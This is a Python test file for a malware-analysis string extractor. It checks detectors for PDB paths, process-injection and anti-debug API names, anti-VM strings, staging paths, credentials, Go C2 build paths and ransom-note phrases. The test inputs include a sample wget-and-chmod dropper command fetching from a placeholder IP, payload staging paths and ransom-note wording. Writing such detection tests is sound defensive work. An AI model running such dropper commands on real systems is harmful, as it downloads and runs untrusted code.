"""Pure extraction tests -- PE/binary-specific artifacts, credentials, droppers,
ransom language, staging paths. No execution, no AL framework, no real/live IOCs."""
from magpie.extraction import (
    extract_antivm_strings,
    extract_credentials,
    extract_droppers,
    extract_go_build_paths,
    extract_pdb_paths,
    extract_ransom_language,
    extract_staging_paths,
    extract_win32_apis,
)


# ---------------------------------------------------------------------------
# PDB debug paths
# ---------------------------------------------------------------------------

def test_pdb_path_with_username_captured():
    val = r"C:\Users\placeholder_dev\proj\obj\Release\malware.pdb"
    results = extract_pdb_paths(val.encode())
    assert (val, "placeholder_dev") in results


def test_pdb_path_without_users_segment():
    val = r"Z:\build\out\tool.pdb"
    results = extract_pdb_paths(val.encode())
    assert (val, "") in results


def test_no_pdb_path_on_benign_text():
    assert extract_pdb_paths(b"just a normal string, nothing here") == []


# ---------------------------------------------------------------------------
# Win32 API strings
# ---------------------------------------------------------------------------

def test_win32_api_process_injection_detected():
    blob = b"imports: VirtualAllocEx WriteProcessMemory CreateRemoteThread"
    found = extract_win32_apis(blob)
    assert "process_injection" in found
    assert {"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"} <= found["process_injection"]


def test_win32_api_dynamic_resolution_alone_still_returned_for_table():
    # extract_win32_apis() itself is a pure "what did we find" function -- the
    # "don't score dynamic_resolution alone" rule is an orchestration decision
    # made in magpie.py, not here. It should still appear in the returned dict.
    blob = b"LoadLibraryA GetProcAddress"
    found = extract_win32_apis(blob)
    assert set(found.keys()) == {"dynamic_resolution"}


def test_win32_api_combo_detects_both_categories():
    blob = b"LoadLibraryA VirtualAllocEx"
    found = extract_win32_apis(blob)
    assert "dynamic_resolution" in found
    assert "process_injection" in found


def test_win32_api_anti_debug_detected():
    blob = b"call IsDebuggerPresent then CheckRemoteDebuggerPresent"
    found = extract_win32_apis(blob)
    assert "anti_debug_anti_vm" in found


def test_no_win32_api_on_benign_text():
    assert extract_win32_apis(b"hello world, just a normal string") == {}


# ---------------------------------------------------------------------------
# Anti-VM strings
# ---------------------------------------------------------------------------

def test_antivm_strings_detected():
    blob = b"detected VBox and SbieDll.dll on this system"
    found = extract_antivm_strings(blob)
    assert "VBox" in found
    assert "SbieDll.dll" in found


def test_antivm_common_word_not_matched():
    # sanity check: ordinary prose containing "Virtual" with a space must not
    # spuriously match -- the patterns require the exact distinctive tokens.
    found = extract_antivm_strings(b"Virtual Box office sales were strong this quarter")
    assert found == []


# ---------------------------------------------------------------------------
# Staging/drop paths
# ---------------------------------------------------------------------------

def test_staging_path_linux_forms():
    found = extract_staging_paths(b"/dev/shm/payload /var/tmp/x.sh")
    assert any(p.startswith("/dev/shm/") for p in found)
    assert any(p.startswith("/var/tmp/") for p in found)


def test_staging_path_windows_form():
    val = r"\AppData\Local\Temp\payload.exe"
    found = extract_staging_paths(val.encode())
    assert any(p.startswith(r"\AppData\Local\Temp\\") or val in p for p in found)


# ---------------------------------------------------------------------------
# Shell dropper (regression, unchanged pattern)
# ---------------------------------------------------------------------------

def test_dropper_pattern_regression():
    val = "wget http://198.51.100.5/x -O /tmp/x && chmod +x"
    found = extract_droppers(val.encode())
    assert found == [val]


def test_no_dropper_on_benign_text():
    # "chmod is too" never forms "chmod +x", so the wget/curl...chmod+x pattern
    # must not match -- confirms the regex isn't matching on wget/chmod in
    # isolation, only the specific dropper shape.
    assert extract_droppers(b"wget is a fine tool, chmod is too, just not together") == []


# ---------------------------------------------------------------------------
# Credentials -- placeholder denylist + structural form
# ---------------------------------------------------------------------------

def test_credential_placeholder_denylist_suppresses_noise():
    creds = extract_credentials(b"password=changeme")
    assert creds == []


def test_credential_realistic_value_still_matches():
    creds = extract_credentials(b"password=Tr0ub4dor&3xyz")
    assert ("generic_password_kv", "Tr0ub4dor&3xyz") in creds


def test_credential_userpass_at_host_only_in_stratum_context():
    # without a stratum string present, user:pass@host should NOT be extracted
    # (matches the existing, unchanged scoping behaviour)
    no_stratum = extract_credentials(b"contact admin:hunter2pass@example.com for help")
    assert not any(t == "userpass_at_host" for t, _ in no_stratum)

    with_stratum = extract_credentials(
        b"stratum+tcp://pool.example:3333\nadmin:hunter2pass@example.com"
    )
    assert any(t == "userpass_at_host" for t, _ in with_stratum)


def test_bare_pwd_env_var_not_treated_as_credential():
    # Regression: a real Go ARM ELF sample's Magpie result reported
    # "PATH3125Atoi-Inf+InfquitJuneJuly" as a leaked "generic_password_kv"
    # credential. The actual raw bytes were "...PWD=PATH3125Atoi-Inf+InfquitJune
    # July as hour in /etc..." -- Go's own PWD env-var-name constant, packed with
    # zero delimiter bytes against unrelated stdlib string constants (strconv,
    # time month names). Bare "pwd" is too ambiguous a keyword (collides with the
    # extremely common $PWD env var) and was dropped in favour of just
    # "password"/"passwd".
    creds = extract_credentials(b"PWD=/home/user")
    assert creds == []


# ---------------------------------------------------------------------------
# Go build path leaks
# ---------------------------------------------------------------------------

def test_go_build_path_with_suspicious_project_name():
    # Structurally the same shape as the real finding that prompted this feature
    # (a live sample embedded "/root/eclipse-c2/eclipse-c2/bot_client.go") but
    # not the literal string, per house convention of not replaying a real
    # sample's exact strings verbatim in committed test fixtures.
    val = "/root/shadow-c2/shadow-c2/bot_client.go"
    found = extract_go_build_paths(val.encode())
    assert found == [(val, "shadow-c2", True)]


def test_go_build_path_benign_project_not_flagged_suspicious():
    val = "/home/dev/proj/main.go"
    found = extract_go_build_paths(val.encode())
    assert found == [(val, "proj", False)]


def test_go_build_path_stdlib_noise_filtered_out():
    assert extract_go_build_paths(b"/usr/local/go/src/runtime/proc.go") == []
    assert extract_go_build_paths(b"/root/go/pkg/mod/github.com/foo/bar.go") == []


def test_go_build_path_keyword_boundary_avoids_incidental_substrings():
    # "sync2"/"func2" contain "c2" as a substring but must not be flagged --
    # SUSPICIOUS_PROJECT_KEYWORDS matching is boundary-aware.
    val = "/home/dev/sync2/main.go"
    found = extract_go_build_paths(val.encode())
    assert found == [(val, "sync2", False)]


def test_no_go_build_path_on_benign_text():
    assert extract_go_build_paths(b"just a normal string, nothing here") == []


# ---------------------------------------------------------------------------
# Ransom note language
# ---------------------------------------------------------------------------

def test_ransom_language_detected():
    val = b"Your files have been encrypted. Contact us for the decryption key."
    found = extract_ransom_language(val)
    assert found  # at least one phrase matched


def test_no_ransom_language_on_benign_text():
    assert extract_ransom_language(b"just a normal informational message") == []
